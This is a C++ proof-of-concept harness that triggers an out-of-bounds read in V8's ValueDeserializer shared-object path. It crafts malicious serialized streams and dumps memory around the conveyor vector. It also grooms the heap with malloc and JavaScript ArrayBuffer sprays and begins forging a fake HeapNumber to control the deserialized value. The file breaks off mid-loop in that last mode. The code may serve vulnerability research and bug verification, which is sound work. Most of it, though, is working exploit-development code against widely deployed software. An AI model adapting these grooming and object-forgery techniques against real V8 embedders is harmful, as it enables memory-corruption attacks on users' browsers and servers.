// PoC verification harness for V8 ValueDeserializer kSharedObject ->
// SharedObjectConveyorHandles::GetPersisted OOB read (missing bounds check in
// release builds; only a DCHECK).
//
// Target (static-verified at head-main):
//   src/objects/value-serializer.cc  ReadSharedObject (~2616-2648)
//     uint32_t shared_object_id;  ReadVarint<uint32_t>() -> [0 .. 2^32-1]
//     delegate_->GetSharedValueConveyor(isolate) -> conveyor
//     DirectHandle<HeapObject> shared_object(
//         shared_object_conveyor_->GetPersisted(shared_object_id), isolate_);
//   src/handles/shared-object-conveyor-handles.h
//     Tagged<HeapObject> GetPersisted(uint32_t id) const {
//       DCHECK(HasPersisted(id));          // GONE in release builds
//       return *shared_objects_[id];       // OOB: double deref, see below
//     }
//
// OOB mechanics (Handle<HeapObject> == pointer-to-slot, 8 bytes):
//   S = *(uint64_t*)(vec.data() + 8*K)      (1st read: OOB on vector storage)
//   T = *(uint64_t*)S                       (2nd read: *S taken as Tagged)
//   T becomes the deserialized JS value (after AddObjectWithID/return).
//
// Modes:
//   pop  N [K]   : populate conveyor with N shared structs, sanity-deserialize
//                  K (default N-1, in-bounds) -> must return the SAME object.
//   dump N       : populate, print full slot window + maps info, exit (no
//                  deserializer call; safe on debug builds).
//   s1 [N] [K]   : populate N (default 4), deserialize id K (default
//                  0x7fffffff). Expect SIGSEGV in GetPersisted.
//   s2 N K       : populate, dump, deserialize small OOB K, JS probes.
//   s3 N K sz cnt: populate, then C++ malloc-spray grooming: <cnt> chunks of
//                  <sz> bytes, every qword = &control_block, control block
//                  content selectable via S3_T; deserialize K; JS probes.
//                  Env S3_T: "smi1337" (default) or "marker".
//                  (pure-C++ deterministic grooming model)
//   s3js N K sz cnt : like s3 but grooming via JS ArrayBuffer spray whose
//                  bytes carry &control_block repeatedly (pure-JS attacker
//                  model).
//   s3a N sz cnt [capMB] : like s3 (malloc spray) but page-granular forward
//                  scan from the vector base for slots containing
//                  &control_block; records first hits + uncontrolled-mapped
//                  even-slot stats, then attacks the first hit K.
//   s3jsa N sz cnt [capMB] : like s3a but the spray is JS ArrayBuffers whose
//                  bytes carry &control_block (pure-JS attacker model).
//
// Streams (all modes that deserialize):  ff 0f 70 <varint(K)>
//   ff 0f = version 15 header; 0x70 = 'p' = kSharedObject; varint = uint32 LEB128.

#include <cinttypes>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <optional>
#include <string>
#include <vector>

#include <execinfo.h>
#include <malloc.h>
#include <setjmp.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

#include "libplatform/libplatform.h"
#include "v8.h"

using v8::ArrayBuffer;
using v8::BackingStore;
using v8::Context;
using v8::Isolate;
using v8::Local;
using v8::MaybeLocal;
using v8::String;
using v8::TryCatch;
using v8::Value;
using v8::ValueDeserializer;
using v8::ValueSerializer;

// ---------------------------------------------------------------------------
// Delegate plumbing: keep the SharedValueConveyor between serialize and
// deserialize phases (mirrors d8's SerializationData + Serializer/Deserializer
// delegates from src/d8/d8.cc:7798+,8023+).
// ---------------------------------------------------------------------------
struct ConveyorHolder {
  std::optional<v8::SharedValueConveyor> conveyor;
};

class SerDelegate : public v8::ValueSerializer::Delegate {
 public:
  explicit SerDelegate(ConveyorHolder* h, Isolate* i) : h_(h), i_(i) {}
  void ThrowDataCloneError(Local<String> message) override {
    String::Utf8Value utf8(i_, message);
    fprintf(stderr, "[ser] ThrowDataCloneError: %s\n", *utf8 ? *utf8 : "?");
    // Embedders would throw; for our purposes aborting serialization is fine.
  }
  bool AdoptSharedValueConveyor(Isolate* isolate,
                                v8::SharedValueConveyor&& conveyor) override {
    fprintf(stderr, "[ser] AdoptSharedValueConveyor: adopted\n");
    h_->conveyor.emplace(std::move(conveyor));
    return true;
  }

 private:
  ConveyorHolder* h_;
  Isolate* i_;
};

class DeserDelegate : public v8::ValueDeserializer::Delegate {
 public:
  explicit DeserDelegate(ConveyorHolder* h) : h_(h) {}
  const v8::SharedValueConveyor* GetSharedValueConveyor(
      Isolate* isolate) override {
    fprintf(stderr, "[deser] GetSharedValueConveyor -> %s\n",
            h_->conveyor.has_value() ? "CONVEYOR" : "null");
    return h_->conveyor.has_value() ? &*h_->conveyor : nullptr;
  }

 private:
  ConveyorHolder* h_;
};

// ---------------------------------------------------------------------------
// Introspection helpers (layout puns; this exact build only).
// v8::SharedValueConveyor        = { std::unique_ptr<SharedObjectConveyorHandles> }
// internal::SharedObjectConveyorHandles = {
//     std::unique_ptr<PersistentHandles>   persistent_handles_;   // +0
//     std::vector<Handle<HeapObject>>      shared_objects_;       // +8
// }
// ---------------------------------------------------------------------------
struct ConveyorHandlesMirror {
  void* persistent_handles;
  uint64_t* vec_begin;
  uint64_t* vec_end;
  uint64_t* vec_cap;
};

static ConveyorHandlesMirror* MirrorOf(v8::SharedValueConveyor* c) {
  return reinterpret_cast<ConveyorHandlesMirror*>(*reinterpret_cast<void**>(c));
}

static bool IsMapped(const void* p) {
  static long ps = sysconf(_SC_PAGESIZE);
  void* page = reinterpret_cast<void*>(reinterpret_cast<uintptr_t>(p) &
                                       ~static_cast<uintptr_t>(ps - 1));
  unsigned char v = 0;
  return mincore(page, static_cast<size_t>(ps), &v) == 0;
}

// True iff every page touched by [p, p+len) is resident.
static bool IsMappedRange(const void* p, size_t len) {
  static long ps = sysconf(_SC_PAGESIZE);
  uintptr_t a = reinterpret_cast<uintptr_t>(p);
  for (uintptr_t x = a & ~static_cast<uintptr_t>(ps - 1); x < a + len;
       x += ps) {
    unsigned char v = 0;
    if (mincore(reinterpret_cast<void*>(x), static_cast<size_t>(ps), &v) != 0)
      return false;
  }
  return true;
}

// Local<T> ~= { internal::Address* val_; } : read the tagged value out.
static uint64_t RawTaggedOfLocal(Local<Value> v) {
  void* slot = *reinterpret_cast<void**>(&v);
  if (!IsMapped(slot)) return 0;
  return *reinterpret_cast<uint64_t*>(slot);
}

static void DumpConveyor(const char* tag, ConveyorHolder* holder) {
  fprintf(stderr, "----- conveyor dump (%s) -----\n", tag);
  if (!holder->conveyor.has_value()) {
    fprintf(stderr, "(no conveyor)\n");
    return;
  }
  void* handles_obj = *reinterpret_cast<void**>(&*holder->conveyor);
  fprintf(stderr, "handles obj=%p raw[0..8):", handles_obj);
  for (int i = 0; i < 8; i++)
    fprintf(stderr, " 0x%016" PRIx64,
            reinterpret_cast<uint64_t*>(handles_obj)[i]);
  fprintf(stderr, "\n");
  ConveyorHandlesMirror* m = reinterpret_cast<ConveyorHandlesMirror*>(handles_obj);
  fprintf(stderr, "mirror guess: ph=%p vec_begin=%p vec_end=%p vec_cap=%p\n",
          m->persistent_handles, (void*)m->vec_begin, (void*)m->vec_end,
          (void*)m->vec_cap);
  // Robust size detection: begin = qword that points to a small chunk holding
  // back-pointers into the persistent-handles area; just use malloc_usable_size
  // of the buffer we find at obj+8 (validated by pop-mode sanity run).
  uint64_t* buf = reinterpret_cast<uint64_t*>(
      reinterpret_cast<uint64_t*>(handles_obj)[1]);
  fprintf(stderr, "vector buffer(obj+8)=%p malloc_usable_size=%zu\n",
          (void*)buf, buf ? malloc_usable_size(buf) : 0);
  fflush(stderr);
}

// Dump slots around the vector buffer end, mirroring GetPersisted's two reads.
// n = number of persisted entries (logical vector size).
static void DumpWindow(ConveyorHolder* holder, int64_t n, int64_t lo,
                       int64_t hi) {
  void* handles_obj = *reinterpret_cast<void**>(&*holder->conveyor);
  uint64_t* base =
      reinterpret_cast<uint64_t*>(reinterpret_cast<uint64_t*>(handles_obj)[1]);
  fprintf(stderr, "[window] base=%p usable=%zu n=%" PRId64 " ; probing idx [%"
                  PRId64 " .. %" PRId64 "]\n",
          (void*)base, malloc_usable_size(base), n, lo, hi);
  for (int64_t i = lo; i <= hi; i++) {
    const uint64_t* slotaddr =
        reinterpret_cast<const uint64_t*>(reinterpret_cast<uint8_t*>(base) +
                                          i * 8);
    char mark = ' ';
    if (i == n) mark = '>';  // first OOB slot wrt logical size
    fprintf(stderr, "  %c idx=%" PRId64 " addr=%p ", mark, i,
            (const void*)slotaddr);
    if (!IsMapped(slotaddr)) {
      fprintf(stderr, "SLOT PAGE UNMAPPED\n");
      continue;
    }
    uint64_t S = *slotaddr;
    fprintf(stderr, "S=0x%016" PRIx64, S);
    const char* ann = "";
    if (i >= 0 && i < n)
      ann = "in-bounds handle";
    else if ((uint64_t)((uint8_t*)slotaddr - (uint8_t*)base) <
             malloc_usable_size(base))
      ann = "OOB-in-malloc-slack";
    else
      ann = "OOB-past-allocation";
    fprintf(stderr, " %s", ann);
    if (S != 0 && IsMapped(reinterpret_cast<void*>(S)))
      fprintf(stderr, "  -> T=*S=0x%016" PRIx64,
              *reinterpret_cast<uint64_t*>(S));
    else
      fprintf(stderr, "  -> S unmapped/zero (deref would fault)");
    fprintf(stderr, "\n");
    fflush(stderr);
  }
  fprintf(stderr, "[window] end\n");
}

// Precompiled probe scripts (compiled before any heavy scan; running needs
// no JSDispatchTable allocation, unlike Compile).
static v8::Global<v8::Script> g_p_typeof, g_p_val, g_p_eq0, g_p_eqm;
static bool g_probes_ready = false;

static void PrepareProbes(Isolate* isolate, Local<Context> context) {
  auto compile = [&](const char* src_text, v8::Global<v8::Script>* out) {
    Local<String> src =
        String::NewFromUtf8(isolate, src_text).ToLocalChecked();
    TryCatch tc(isolate);
    v8::Local<v8::Script> script;
    if (!v8::Script::Compile(context, src).ToLocal(&script)) {
      fprintf(stderr, "[prep] compile failed for: %s\n", src_text);
      return false;
    }
    out->Reset(isolate, script);
    return true;
  };
  bool ok = true;
  ok &= compile("typeof v", &g_p_typeof);
  ok &= compile("''+v", &g_p_val);
  ok &= compile("v === globalThis.__so[0]", &g_p_eq0);
  ok &= compile("v === globalThis.markerObj", &g_p_eqm);
  g_probes_ready = ok;
  fprintf(stderr, "[prep] probes compiled=%d\n", (int)ok);
}

static void RunPrepared(Isolate* isolate, Local<Context> context,
                        const char* label, const v8::Global<v8::Script>& s) {
  if (s.IsEmpty()) {
    fprintf(stderr, "[js:p] %s: not compiled\n", label);
    return;
  }
  TryCatch tc(isolate);
  MaybeLocal<Value> result =
      s.Get(isolate)->Run(context);
  if (result.IsEmpty()) {
    Local<Value> exc = tc.Exception();
    v8::String::Utf8Value utf8(isolate, exc.IsEmpty() ? Local<Value>() : exc);
    fprintf(stderr, "[js:p] %s threw: %s\n", label,
            exc.IsEmpty() ? "(null)" : (*utf8 ? *utf8 : "(unprintable)"));
  } else {
    v8::String::Utf8Value utf8(isolate, result.ToLocalChecked());
    fprintf(stderr, "[js:p] %s => %s\n", label, *utf8 ? *utf8 : "(unprintable)");
  }
  fflush(stderr);
}

static void RunJS(Isolate* isolate, Local<Context> context,
                  const char* source_text) {
  if (getenv("VDBG")) fprintf(stderr, "[js] RunJS enter: %s\n", source_text);
  Local<String> src =
      String::NewFromUtf8(isolate, source_text).ToLocalChecked();
  TryCatch tc(isolate);
  v8::Local<v8::Script> script;
  if (!v8::Script::Compile(context, src).ToLocal(&script)) {
    fprintf(stderr, "[js] compile failed\n");
    return;
  }
  if (getenv("VDBG")) { fprintf(stderr, "[js] compiled, running...\n"); fflush(stderr); }
  MaybeLocal<Value> result = script->Run(context);
  if (getenv("VDBG")) { fprintf(stderr, "[js] run done, empty=%d\n", result.IsEmpty()); fflush(stderr); }
  if (result.IsEmpty()) {
    Local<Value> exc = tc.Exception();
    v8::String::Utf8Value utf8(isolate, exc.IsEmpty() ? Local<Value>() : exc);
    fprintf(stderr, "[js] threw: %s\n",
            exc.IsEmpty() ? "(null)" : (*utf8 ? *utf8 : "(unprintable)"));
  } else {
    v8::String::Utf8Value utf8(isolate, result.ToLocalChecked());
    fprintf(stderr, "[js] => %s\n", *utf8 ? *utf8 : "(unprintable)");
  }
  fflush(stderr);
}

// ---------------------------------------------------------------------------
// Populate: create N shared structs in JS, serialize them with a delegate that
// adopts the conveyor. Serialization buffer is discarded; the conveyor (owned
// by the embedder/holder) keeps the N persisted shared objects alive.
// ---------------------------------------------------------------------------
static bool Populate(Isolate* isolate, Local<Context> context,
                     ConveyorHolder* holder, int n) {
  char js[1024];
  snprintf(js, sizeof(js),
           "globalThis.__SharedT = new SharedStructType(['x']);"
           "globalThis.__so = [];"
           "for (let i = 0; i < %d; i++) { let s = new __SharedT(); s.x = 0x100+i; __so.push(s); }"
           "'created '+__so.length+' shared structs'",
           n);
  RunJS(isolate, context, js);

  Local<Value> arr;
  {
    Local<String> name = String::NewFromUtf8Literal(isolate, "__so");
    if (!context->Global()->Get(context, name).ToLocal(&arr) ||
        !arr->IsArray()) {
      fprintf(stderr, "[pop] __so not an array\n");
      return false;
    }
  }

  SerDelegate ser_del(holder, isolate);
  ValueSerializer ser(isolate, &ser_del);
  ser.WriteHeader();
  bool ok = false;
  if (!ser.WriteValue(context, arr).To(&ok) || !ok) {
    fprintf(stderr, "[pop] WriteValue FAILED\n");
    return false;
  }
  std::pair<uint8_t*, size_t> pair = ser.Release();
  fprintf(stderr, "[pop] serialized %d shared structs into %zu output bytes "
          "(conveyor kept)\n",
          n, pair.second);
  free(pair.first);

  if (!holder->conveyor.has_value()) {
    fprintf(stderr, "[pop] NO conveyor adopted?!\n");
    return false;
  }
  DumpConveyor("post-populate", holder);
  return true;
}

// ---------------------------------------------------------------------------
// Attack: stream ff 0f 70 <varint K> through a deserializer whose delegate
// returns the kept conveyor.
// ---------------------------------------------------------------------------
static std::vector<uint8_t> MakeStream(uint32_t K) {
  std::vector<uint8_t> st = {0xFF, 0x0F, 0x70};
  uint32_t v = K;
  do {
    uint8_t b = v & 0x7F;
    v >>= 7;
    if (v) b |= 0x80;
    st.push_back(b);
  } while (v);
  return st;
}

static MaybeLocal<Value> DoAttack(Isolate* isolate, Local<Context> context,
                                  ConveyorHolder* holder, uint32_t K,
                                  Local<Value>* out) {
  std::vector<uint8_t> st = MakeStream(K);
  fprintf(stderr, "[atk] stream bytes:");
  for (uint8_t b : st) fprintf(stderr, " %02x", b);
  fprintf(stderr, "  (K=%u / 0x%x)\n", K, K);
  fflush(stderr);

  DeserDelegate deser_del(holder);
  ValueDeserializer deser(isolate, st.data(), st.size(), &deser_del);
  bool ok = false;
  if (!deser.ReadHeader(context).To(&ok) || !ok) {
    fprintf(stderr, "[atk] ReadHeader FAILED\n");
    return {};
  }
  fprintf(stderr, "[atk] header ok, wire version=%u\n",
          deser.GetWireFormatVersion());
  fflush(stderr);
  {
    TryCatch tc(isolate);
    MaybeLocal<Value> v = deser.ReadValue(context);
    if (v.IsEmpty()) {
      Local<Value> exc = tc.Exception();
      v8::String::Utf8Value utf8(isolate, exc.IsEmpty() ? Local<Value>() : exc);
      fprintf(stderr, "[atk] ReadValue EMPTY, exception: %s\n",
              exc.IsEmpty() ? "(none)" : (*utf8 ? *utf8 : "?"));
      return {};
    }
    *out = v.ToLocalChecked();
  }
  return *out;
}

static void JsProbes(Isolate* isolate, Local<Context> context,
                     Local<Value> v) {
  fprintf(stderr, "[atk] ReadValue NON-EMPTY; raw tagged of result = "
          "0x%016" PRIx64 "\n",
          RawTaggedOfLocal(v));
  fflush(stderr);
  // Pure-API observations (no script compile/run needed):
  fprintf(stderr, "[api] IsNumber=%d IsObject=%d IsString=%d\n",
          (int)v->IsNumber(), (int)v->IsObject(), (int)v->IsString());
  if (v->IsNumber()) {
    int64_t iv = v->IntegerValue(context).FromMaybe(-999999999);
    fprintf(stderr, "[api] IntegerValue=%" PRId64 "\n", iv);
  }
  context->Global()
      ->Set(context, String::NewFromUtf8Literal(isolate, "v"), v)
      .FromJust();
  if (g_probes_ready) {
    RunPrepared(isolate, context, "typeof v", g_p_typeof);
    RunPrepared(isolate, context, "''+v", g_p_val);
    RunPrepared(isolate, context, "v === __so[0]", g_p_eq0);
    RunPrepared(isolate, context, "v === markerObj", g_p_eqm);
    return;
  }
  fprintf(stderr, "[js] typeof v ...\n");
  RunJS(isolate, context, "typeof v");
  RunJS(isolate, context, "''+v");
  RunJS(isolate, context, "v === globalThis.__so[0]");
  RunJS(isolate, context, "v === globalThis.markerObj");
}

// Forward scan from the conveyor vector base for slots "containing" cb_addr
// (i.e., S == cb), page-granular so unmapped gaps are skipped safely.
// Also tallies slots whose S is itself a mapped canonical user-space pointer
// with (*S & 1) == 0 (=> would surface to JS as Smi => uncontrolled leak).
struct ScanResult {
  std::vector<int64_t> cb_hits;      // K values where S == control block
  int64_t matched_ptr = 0;           // slots with mapped-pointer S
  int64_t even_t = 0;                // of those, even *S (Smi-shaped)
  int64_t nonzero = 0;
  int64_t scanned = 0;               // total slots inspected
  int64_t odd_t = 0;
  int64_t faults = 0;                // SIGSEGV recoveries during scan
  struct Example { int64_t k; uint64_t s; uint64_t t; };
  std::vector<Example> even_examples;
};

static sigjmp_buf g_scan_jmp;
static volatile sig_atomic_t g_scan_active = 0;
static volatile sig_atomic_t g_scan_tid = 0;
static void MapsContaining(void* addr) {
  // async-signal-tolerant-ish dump of which vm area contains addr
  FILE* f = fopen("/proc/self/maps", "r");
  if (!f) { write(2, "[maps] open fail\n", 17); return; }
  uintptr_t a = reinterpret_cast<uintptr_t>(addr);
  char line[512];
  int found = 0, nearby = 0;
  uintptr_t prev_end = 0; char prev_line[512] = {0};
  while (fgets(line, sizeof(line), f)) {
    uintptr_t lo, hi;
    if (sscanf(line, "%lx-%lx", &lo, &hi) != 2) continue;
    if (a >= lo && a < hi) {
      write(2, "[maps] si in: ", 14);
      write(2, line, strlen(line));
      found = 1;
    } else if (a >= hi && a - hi < 0x400000 && !nearby) {
      snprintf(line + strlen(line), 8, ""); write(2, "[maps] prev: ", 13);
      write(2, line, strlen(line));
      nearby = 1;
    }
    prev_end = hi; strcpy(prev_line, line);
    (void)prev_end;
  }
  if (!found && !nearby && prev_line[0]) {
    write(2, "[maps] last: ", 13); write(2, prev_line, strlen(prev_line));
  }
  fclose(f);
}

static void ScanSegvHandler(int sig, siginfo_t* si, void*) {
  if (g_scan_active &&
      syscall(SYS_gettid) == (pid_t)g_scan_tid)
    siglongjmp(g_scan_jmp, 1);
  char buf[256];
  int n = snprintf(buf, sizeof(buf),
                   "\n[crash] SIGSEGV si_addr=%p (reporter, outside scan)\n",
                   si ? si->si_addr : nullptr);
  write(2, buf, n);
  void* bt[64];
  int nb = backtrace(bt, 64);
  backtrace_symbols_fd(bt, nb, 2);
  if (si) MapsContaining(si->si_addr);
  // If a chained V8 handler already repaired the faulting page (lazy table
  // commit), returning here retries the instruction. Give up on the second
  // fault at the same address.
  static volatile sig_atomic_t g_rep_once = 0;
  static void* g_rep_addr = nullptr;
  if (si && g_rep_addr != si->si_addr && IsMappedRange(si->si_addr, 8)) {
    g_rep_addr = si->si_addr;
    write(2, "[crash] page now resident; returning to retry\n", 44);
    return;
  }
  signal(SIGSEGV, SIG_DFL);
  raise(SIGSEGV);
  (void)g_rep_once;
}

static ScanResult ScanForCb(uint64_t* base, uint64_t cb_addr,
                            int64_t max_bytes);

// Run ScanForCb in a forked child (crash/segv-recovery damage stays there);
// results stream back over a pipe. Parent state remains pristine.
struct ScanWireHeader {
  int64_t scanned, nonzero, matched_ptr, even_t, odd_t, faults;
  int64_t n_hits, n_examples;
};
struct ScanWireHit { int64_t k; };
struct ScanWireEx { int64_t k; uint64_t s, t; };

static ScanResult ScanForCbForked(uint64_t* base, uint64_t cb_addr,
                                  int64_t max_bytes) {
  ScanResult r;
  int fds[2];
  if (pipe(fds) != 0) return r;
  pid_t pid = fork();
  if (pid == 0) {
    // child: no v8 api calls; plain memory crawl.
    ScanResult cr = ScanForCb(base, cb_addr, max_bytes);
    ScanWireHeader h{cr.scanned, cr.nonzero, cr.matched_ptr, cr.even_t,
                     cr.odd_t, cr.faults, (int64_t)cr.cb_hits.size(),
                     (int64_t)cr.even_examples.size()};
    if (write(fds[1], &h, sizeof(h)) < 0) _exit(2);
    for (int64_t k : cr.cb_hits) {
      ScanWireHit wh{k};
      if (write(fds[1], &wh, sizeof(wh)) < 0) _exit(2);
    }
    for (auto& e : cr.even_examples) {
      ScanWireEx we{e.k, e.s, e.t};
      if (write(fds[1], &we, sizeof(we)) < 0) _exit(2);
    }
    close(fds[1]);
    _exit(0);
  }
  close(fds[1]);
  ScanWireHeader h{};
  auto rd = [&](void* p, size_t sz) -> bool {
    size_t got = 0;
    while (got < sz) {
      ssize_t n = read(fds[0], reinterpret_cast<uint8_t*>(p) + got, sz - got);
      if (n <= 0) return false;
      got += (size_t)n;
    }
    return true;
  };
  if (rd(&h, sizeof(h))) {
    r.scanned = h.scanned; r.nonzero = h.nonzero; r.matched_ptr = h.matched_ptr;
    r.even_t = h.even_t; r.odd_t = h.odd_t; r.faults = h.faults;
    for (int64_t i = 0; i < h.n_hits; i++) {
      ScanWireHit wh{}; if (!rd(&wh, sizeof(wh))) break;
      r.cb_hits.push_back(wh.k);
    }
    for (int64_t i = 0; i < h.n_examples; i++) {
      ScanWireEx we{}; if (!rd(&we, sizeof(we))) break;
      r.even_examples.push_back({we.k, we.s, we.t});
    }
  }
  close(fds[0]);
  int status = 0;
  waitpid(pid, &status, 0);
  fprintf(stderr, "[scan] child exit status=%d%s\n", status,
          (h.n_hits >= 0 && status == 0) ? " (clean)" : "");
  return r;
}

static ScanResult ScanForCb(uint64_t* base, uint64_t cb_addr,
                            int64_t max_bytes) {
  ScanResult r;
  const int64_t page = 4096;
  bool do_deref_stats = getenv("S3_NODSTAT") == nullptr;
  g_scan_tid = (sig_atomic_t)syscall(SYS_gettid);
  g_scan_active = 1;
  for (int64_t off = 0; off < max_bytes; off += page) {
    int64_t off_jmp = off;
    if (sigsetjmp(g_scan_jmp, 1)) {
      off = off_jmp;
      r.faults++;
      continue;  // faulted inside this page: skip it
    }
    uint8_t* p = reinterpret_cast<uint8_t*>(base) + off;
    if (!IsMappedRange(p, page)) continue;
    int64_t nslots = page / 8;
    for (int64_t j = 0; j < nslots; j++) {
      int64_t i = (off / 8) + j;
      uint64_t S = reinterpret_cast<uint64_t*>(p)[j];
      r.scanned++;
      if (S == 0) continue;
      r.nonzero++;
      if (S == cb_addr) {
        if (IsMappedRange(reinterpret_cast<void*>(S), 8))
          r.cb_hits.push_back(i);
        continue;
      }
      if (!do_deref_stats) continue;
      // plausible canonical userspace pointer?
      if ((S >> 47) == 0 && (S & 7) == 0 &&
          S >= 0x1000 && IsMappedRange(reinterpret_cast<void*>(S), 8)) {
        r.matched_ptr++;
        uint64_t T = *reinterpret_cast<uint64_t*>(S);
        if ((T & 1) == 0) {
          r.even_t++;
          if (r.even_examples.size() < 6)
            r.even_examples.push_back({i, S, T});
        } else {
          r.odd_t++;
        }
      }
    }
  }
  g_scan_active = 0;
  return r;
}

// JS spray source builder for s3js: ArrayBuffer spray of <sz> bytes each,
// whose bytes carry the 8-byte LE address of the malloc'd control block,
// repeated. (Address known at C++ level, injected into the script text.)
static std::string JsSpraySource(size_t sz, int cnt, uint64_t cb_addr) {
  char buf[2048];
  snprintf(buf, sizeof(buf),
           "globalThis.__spray = [];"
           "const CB = 0x%" PRIx64 "n;"
           "for (let i = 0; i < %d; i++) {"
           "  let ab = new ArrayBuffer(%zu);"
           "  let dv = new DataView(ab);"
           "  for (let o = 0; o + 8 <= %zu; o += 8) {"
           "    dv.setUint32(o, Number(BigInt.asUintN(64, CB) & 0xffffffffn), true);"
           "    dv.setUint32(o+4, Number(BigInt.asUintN(64, CB) >> 32n), true);"
           "  }"
           "  __spray.push(ab);"
           "}"
           "'sprayed '+__spray.length+' x %zu'",
           (unsigned long long)cb_addr, cnt, sz, sz, sz);
  return std::string(buf);
}

int main(int argc, char* argv[]) {
  if (argc < 2) {
    fprintf(stderr, "usage: %s pop|dump|s1|s2|s3|s3js N K [sz cnt]\n", argv[0]);
    return 64;
  }
  std::string mode = argv[1];
  unsigned N = argc > 2 ? (unsigned)strtoul(argv[2], nullptr, 0) : 4;
  uint32_t K = argc > 3 ? (uint32_t)strtoull(argv[3], nullptr, 0) : 0x7fffffff;
  size_t gsz = argc > 4 ? (size_t)strtoul(argv[4], nullptr, 0) : 256;
  int gcnt = argc > 5 ? (int)strtoul(argv[5], nullptr, 0) : 64;

  fprintf(stderr, "[*] mode=%s N=%u K=%u(0x%x) spray=%zux%d\n", mode.c_str(), N,
          K, K, gsz, gcnt);

  // Process-wide crash reporter (scan window longjmps instead; see
  // ScanSegvHandler).
  {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = ScanSegvHandler;
    sa.sa_flags = SA_SIGINFO | SA_NODEFER;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, nullptr);
  }

  v8::V8::InitializeICUDefaultLocation(argv[0]);
  v8::V8::InitializeExternalStartupData(argv[0]);
  v8::V8::SetFlagsFromString("--expose-gc --harmony-struct");
  std::unique_ptr<v8::Platform> platform = v8::platform::NewDefaultPlatform();
  v8::V8::InitializePlatform(platform.get());
  v8::V8::Initialize();

  Isolate::CreateParams create_params;
  create_params.array_buffer_allocator =
      ArrayBuffer::Allocator::NewDefaultAllocator();
  Isolate* isolate = Isolate::New(create_params);
  {
    Isolate::Scope isolate_scope(isolate);
    v8::HandleScope handle_scope(isolate);
    Local<Context> context = Context::New(isolate);
    Context::Scope context_scope(context);
    ConveyorHolder holder;

    const char* warm = getenv("WARM");
    if (warm && atoi(warm) > 0) {
      char wjs[512];
      snprintf(wjs, sizeof(wjs),
               "globalThis.__w=[]; for (let i=0;i<%d;i++) "
               "__w.push({a:i, b:[i,i+1], c:13.37+i%7}); 'warmed '+__w.length",
               atoi(warm));
      RunJS(isolate, context, wjs);
      fprintf(stderr, "[*] heap warmup x%s\n", warm);
    }

    if (!Populate(isolate, context, &holder, (int)N)) {
      fprintf(stderr, "[*] populate failed\n");
      return 65;
    }

    if (mode == "pop") {
      if (argc <= 3) K = N ? N - 1 : 0;
      Local<Value> v;
      if (!DoAttack(isolate, context, &holder, K, &v).IsEmpty()) {
        fprintf(stderr, "[pop] sanity: got value, raw=0x%016" PRIx64 "\n",
                RawTaggedOfLocal(v));
        context->Global()
            ->Set(context, String::NewFromUtf8Literal(isolate, "v"), v)
            .FromJust();
        RunJS(isolate, context, "typeof v");
        RunJS(isolate, context,
              "globalThis.__soCheck = (v === __so[__so.length-1]);"
              "'identity-with-last=' + __soCheck + ' x=' + v.x");
      }
    } else if (mode == "dump") {
      int64_t n = (int64_t)N;
      DumpWindow(&holder, n, 0, n + 40);
    } else if (mode == "s1") {
      DumpWindow(&holder, (int64_t)N, (int64_t)N - 1, (int64_t)N + 4);
      Local<Value> v;
      DoAttack(isolate, context, &holder, K, &v);
      fprintf(stderr, "[s1] SURVIVED (no crash)\n");
    } else if (mode == "s2") {
      DumpWindow(&holder, (int64_t)N, (int64_t)N - 1, (int64_t)N + 24);
      Local<Value> v;
      if (!DoAttack(isolate, context, &holder, K, &v).IsEmpty()) {
        JsProbes(isolate, context, v);
      }
    } else if (mode == "s3a" || mode == "s3jsa") {
      // Groomed spray + forward scan + attack first hit.
      PrepareProbes(isolate, context);  // before scan-related SEGV recovery
      int64_t cap_mb = argc > 6 ? (int64_t)strtoul(argv[6], nullptr, 0) : 2048;
      uint64_t* cb = reinterpret_cast<uint64_t*>(malloc(64));
      const char* tmode = getenv("S3_T");
      if (!tmode) tmode = "smi1337";
      if (strcmp(tmode, "marker") == 0) {
        RunJS(isolate, context,
              "globalThis.markerObj = {p: 0x41424344, q: [1,2,3]};"
              "'marker created'");
        Local<Value> mv;
        context->Global()
            ->Get(context, String::NewFromUtf8Literal(isolate, "markerObj"))
            .ToLocal(&mv);
        cb[0] = RawTaggedOfLocal(mv);
        cb[1] = cb[0];
      } else if (strcmp(tmode, "smi1337hi") == 0) {
        cb[0] = (uint64_t)1337LL << 32;  // upper-half encoding hypothesis
        cb[1] = cb[0];
      } else {
        // verified THIS build: Smi payload = low32(word) >> 1
        cb[0] = (uint64_t)(1337LL << 1);
        cb[1] = cb[0];
      }
      for (int i = 2; i < 8; i++) cb[i] = 0x4342424242424200 + i;
      if (strcmp(tmode, "fakenum") == 0) {
        // Fake HeapNumber hosted in a JS FixedDoubleArray (in-cage attacker-
        // writable granules). Real HeapNumber map borrowed at runtime.
        // Layout fact (this build): HeapNumber { map:c32 @0, double @4 }.
        RunJS(isolate, context,
              "globalThis.__hn = 13.37;"
              "globalThis.__fa = [13.37, 13.37, 13.37, 13.37];"
              "'primed'");
        Local<Value> hnv;
        context->Global()
            ->Get(context, String::NewFromUtf8Literal(isolate, "__hn"))
            .ToLocal(&hnv);
        uint64_t hn_word = RawTaggedOfLocal(hnv);
        uint64_t cage_base = hn_word & 0xffffffff00000000ULL;
        uint64_t hn_addr = cage_base | (uint32_t)((uint32_t)hn_word & ~1u);
        uint32_t map_c32 = *reinterpret_cast<uint32_t*>(hn_addr);
        double want = 13.37;
        fprintf(stderr,
                "[s4] hn_word=0x%016" PRIx64 " cage_base=0x%016" PRIx64
                " map_c32=0x%08x val_at4=%d\n",
                hn_word, cage_base, map_c32,
                (int)(memcmp(reinterpret_cast<uint8_t*>(hn_addr) + 4, &want,
                             8) == 0));
        // Locate __fa's FixedDoubleArray: probe c32 fields for the one whose
        // target+8 == bits(13.37).
        Local<Value> fav;
        context->Global()
            ->Get(context, String::NewFromUtf8Literal(isolate, "__fa"))
            .ToLocal(&fav);
        uint64_t fa_word = RawTaggedOfLocal(fav);
        uint64_t fa_addr = cage_base | (uint32_t)((uint32_t)fa_word & ~1u);
        uint64_t elem_base = 0;
        for (int o = 4; o <= 12 && !elem_base; o += 4) {
          uint32_t c32;
          memcpy(&c32, reinterpret_cast<uint8_t*>(fa_addr) + o, 4);
          uint64_t cand = cage_base | (uint64_t)(c32 & ~1u);
